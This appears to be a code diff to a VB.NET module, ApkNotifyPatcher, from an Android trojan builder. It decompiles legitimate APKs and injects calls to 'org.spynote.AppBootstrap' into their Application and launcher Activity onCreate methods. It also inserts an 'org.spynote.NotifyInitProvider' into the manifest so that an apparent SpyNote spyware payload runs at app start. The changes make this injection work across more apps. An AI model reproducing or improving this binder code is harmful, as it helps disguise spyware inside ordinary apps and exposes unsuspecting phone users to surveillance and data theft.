+        For Each methodMatch As Match In Regex.Matches(text, methodPattern, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))
+            Dim signatureLine As String = methodMatch.Value.Trim()
+            If PatchOnCreateMethod(text, signatureLine, classDescriptor, hook) Then
                 File.WriteAllText(smaliPath, text, New UTF8Encoding(False))
                 Return True
             End If
@@ -763,14 +1206,23 @@ Public Module ApkNotifyPatcher
         If cIdx >= 0 Then
             insertAt = onCreateStart + cIdx + cCall.Length
         Else
-            Dim superCall As String = "invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V"
-            Dim superIdx As Integer = onCreateBlock.IndexOf(superCall, StringComparison.Ordinal)
-            If superIdx >= 0 Then
-                insertAt = onCreateStart + superIdx + superCall.Length
+            Dim superMatch As Match = Regex.Match(
+                onCreateBlock,
+                "invoke-super\s*\{p0,\s*p1\},\s*[^;]+;->onCreate\(Landroid/os/Bundle;\)V",
+                RegexOptions.None,
+                TimeSpan.FromSeconds(1))
+            If superMatch.Success Then
+                insertAt = onCreateStart + superMatch.Index + superMatch.Length
             Else
-                Dim returnIdx As Integer = onCreateBlock.LastIndexOf("return-void", StringComparison.Ordinal)
-                If returnIdx >= 0 Then
-                    insertAt = onCreateStart + returnIdx
+                Dim superCall As String = "invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V"
+                Dim superIdx As Integer = onCreateBlock.IndexOf(superCall, StringComparison.Ordinal)
+                If superIdx >= 0 Then
+                    insertAt = onCreateStart + superIdx + superCall.Length
+                Else
+                    Dim returnIdx As Integer = onCreateBlock.LastIndexOf("return-void", StringComparison.Ordinal)
+                    If returnIdx >= 0 Then
+                        insertAt = onCreateStart + returnIdx
+                    End If
                 End If
             End If
         End If
@@ -803,6 +1255,25 @@ Public Module ApkNotifyPatcher
         Dim smaliPath As String = ClassNameToSmaliPath(decodeDir, appClass)
         If Not File.Exists(smaliPath) Then Return False
 
+        Return PatchApplicationSmaliHook(smaliPath, appClass)
+    End Function
+
+    Private Function PatchApplicationHookFlexible(decodeDir As String) As Boolean
+        Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
+        Dim appClass As String = FindApplicationClass(manifestPath)
+        If String.IsNullOrWhiteSpace(appClass) Then Return False
+
+        Dim smaliPath As String = ClassNameToSmaliPath(decodeDir, appClass)
+        If File.Exists(smaliPath) AndAlso PatchApplicationSmaliHook(smaliPath, appClass) Then Return True
+
+        For Each smaliRoot As String In Directory.GetDirectories(decodeDir, "smali*")
+            Dim candidate As String = Path.Combine(smaliRoot, appClass.Replace("."c, Path.DirectorySeparatorChar) & ".smali")
+            If File.Exists(candidate) AndAlso PatchApplicationSmaliHook(candidate, appClass) Then Return True
+        Next
+        Return False
+    End Function
+
+    Private Function PatchApplicationSmaliHook(smaliPath As String, appClass As String) As Boolean
         Dim classDescriptor As String = "L" & appClass.Replace("."c, "/"c) & ";"
         Dim hook As String = "    invoke-virtual {p0}, " & classDescriptor & "->getApplicationContext()Landroid/content/Context;" & vbCrLf &
             "    move-result-object v0" & vbCrLf &
@@ -811,19 +1282,18 @@ Public Module ApkNotifyPatcher
         Dim text As String = File.ReadAllText(smaliPath)
         If text.Contains("Lorg/spynote/AppBootstrap;") Then Return True
 
-        Dim signature As String = ".method public onCreate()V"
-        Dim onCreateStart As Integer = text.IndexOf(signature, StringComparison.Ordinal)
-        If onCreateStart < 0 Then Return False
+        Dim methodMatch As Match = Regex.Match(text, "\.method[^\n\r]*\bonCreate\(\)V", RegexOptions.None, TimeSpan.FromSeconds(2))
+        If Not methodMatch.Success Then Return False
 
+        Dim onCreateStart As Integer = methodMatch.Index
         Dim onCreateEnd As Integer = text.IndexOf(".end method", onCreateStart, StringComparison.Ordinal)
         If onCreateEnd < 0 Then Return False
 
         Dim onCreateBlock As String = text.Substring(onCreateStart, onCreateEnd - onCreateStart)
-        Dim superCall As String = "invoke-super {p0}, Landroid/app/Application;->onCreate()V"
-        Dim superIdx As Integer = onCreateBlock.IndexOf(superCall, StringComparison.Ordinal)
-        If superIdx < 0 Then Return False
+        Dim superMatch As Match = Regex.Match(onCreateBlock, "invoke-super\s*\{p0\},\s*[^;]+;->onCreate\(\)V", RegexOptions.None, TimeSpan.FromSeconds(1))
+        If Not superMatch.Success Then Return False
 
-        Dim insertAt As Integer = onCreateStart + superIdx + superCall.Length
+        Dim insertAt As Integer = onCreateStart + superMatch.Index + superMatch.Length
         If insertAt < text.Length AndAlso text(insertAt) = vbCr Then insertAt += 1
         If insertAt < text.Length AndAlso text(insertAt) = vbLf Then insertAt += 1
 
@@ -831,15 +1301,15 @@ Public Module ApkNotifyPatcher
 
         Dim localsMatch As Match = Regex.Match(
             text,
-            "\.method public onCreate\(\)V\s*\r?\n\s*\.locals (\d+)",
+            Regex.Escape(methodMatch.Value) & "\s*\r?\n\s*\.locals (\d+)",
             RegexOptions.None,
             TimeSpan.FromSeconds(1))
         If localsMatch.Success Then
             Dim neededLocals As Integer = Math.Max(2, Integer.Parse(localsMatch.Groups(1).Value))
             text = Regex.Replace(
                 text,
-                "\.method public onCreate\(\)V\s*\r?\n\s*\.locals \d+",
-                ".method public onCreate()V" & vbCrLf & "    .locals " & neededLocals.ToString(),
+                Regex.Escape(methodMatch.Value) & "\s*\r?\n\s*\.locals \d+",
+                methodMatch.Value & vbCrLf & "    .locals " & neededLocals.ToString(),
                 RegexOptions.None,
                 TimeSpan.FromSeconds(1))
         End If
@@ -906,23 +1376,18 @@ Public Module ApkNotifyPatcher
         PatchLauncherHook(decodeDir)
     End Sub
 
-    Private Function EnsureNotifyProviderInManifest(decodeDir As String) As Boolean
+    Private Function EnsureNotifyProviderInManifest(decodeDir As String, payloadDir As String) As Boolean
         Try
+            EnsureNotifyProviderSmali(decodeDir, payloadDir)
             Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
             If Not File.Exists(manifestPath) Then Return False
 
             SanitizeManifestFile(decodeDir)
             Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
-            If text.IndexOf("Lorg/spynote/NotifyInitProvider;", StringComparison.OrdinalIgnoreCase) >= 0 OrElse
-               text.IndexOf("org.spynote.NotifyInitProvider", StringComparison.OrdinalIgnoreCase) >= 0 Then
-                Return True
-            End If
+            If ManifestContainsNotifyProvider(text) Then Return True
+            If TryInsertNotifyProviderXml(manifestPath) Then Return True
 
-            Dim packageName As String = Nothing
-            Dim pkgMatch As Match = Regex.Match(text, "package=""([^""]+)""", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(2))
-            If pkgMatch.Success Then packageName = pkgMatch.Groups(1).Value.Trim()
-            If String.IsNullOrWhiteSpace(packageName) Then packageName = "spynote.client"
-
+            Dim packageName As String = GetManifestPackageFromText(text)
             Dim authority As String = packageName & ".spynote.notify"
             Dim providerBlock As String =
                 "    <provider android:name=""org.spynote.NotifyInitProvider"" android:authorities=""" & authority & """ android:exported=""false"" android:initOrder=""100"" />" & vbCrLf
@@ -937,7 +1402,7 @@ Public Module ApkNotifyPatcher
 
             text = text.Insert(insertAt, providerBlock)
             File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
-            Return True
+            Return ManifestContainsNotifyProvider(File.ReadAllText(manifestPath, Encoding.UTF8))
         Catch
             Return False
         End Try
@@ -998,6 +1463,31 @@ Public Module ApkNotifyPatcher
                     cls = packageName & cls
                 End If
                 Return cls
+            Next
+
+            Dim aliasPattern As String = "<activity-alias\b[\s\S]*?</activity-alias>"
+            For Each aliasMatch As Match In Regex.Matches(manifestText, aliasPattern, RegexOptions.IgnoreCase, TimeSpan.FromSeconds(3))
+                Dim block As String = aliasMatch.Value
+                If block.IndexOf("android.intent.action.MAIN", StringComparison.OrdinalIgnoreCase) < 0 Then Continue For
+                If block.IndexOf("android.intent.category.LAUNCHER", StringComparison.OrdinalIgnoreCase) < 0 Then Continue For
+
+                Dim targetMatch As Match = Regex.Match(block, "android:targetActivity=""([^""]+)""", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(1))
+                If targetMatch.Success Then
+                    Dim cls As String = targetMatch.Groups(1).Value.Trim()
+                    If cls.StartsWith("."c) AndAlso Not String.IsNullOrWhiteSpace(packageName) Then
+                        cls = packageName & cls
+                    End If
+                    Return cls
+                End If
+
+                Dim nameMatch As Match = Regex.Match(block, "android:name=""([^""]+)""", RegexOptions.IgnoreCase, TimeSpan.FromSeconds(1))
+                If nameMatch.Success Then
+                    Dim cls As String = nameMatch.Groups(1).Value.Trim()
+                    If cls.StartsWith("."c) AndAlso Not String.IsNullOrWhiteSpace(packageName) Then
+                        cls = packageName & cls
+                    End If
+                    Return cls
+                End If
             Next
         Catch
         End Try
